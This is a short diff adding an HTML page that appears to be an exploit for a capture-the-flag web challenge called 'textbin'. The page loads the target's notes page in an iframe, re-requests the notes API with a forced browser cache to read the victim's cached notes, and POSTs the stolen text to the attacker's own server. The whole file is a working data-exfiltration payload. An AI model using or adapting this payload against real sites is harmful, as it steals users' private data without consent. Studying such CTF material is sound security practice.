@@ -1,0 +1,25 @@
+<html>
+
+<body>
+    <script>
+        const iframe = document.createElement('iframe');
+        iframe.src = 'https://textbin.ctf.kaf.sh/notes';
+        
+        iframe.addEventListener('load', () => {
+            setTimeout(async () => {
+                const resp = await fetch('https://api.textbin.ctf.kaf.sh/notes', {
+                    cache: 'force-cache'
+                });
+
+                fetch('/', {
+                    method: 'POST',
+                    body: await resp.text()
+                });
+            }, 2000);
+        });
+
+        document.body.appendChild(iframe);
+    </script>
+</body>
+
+</html>
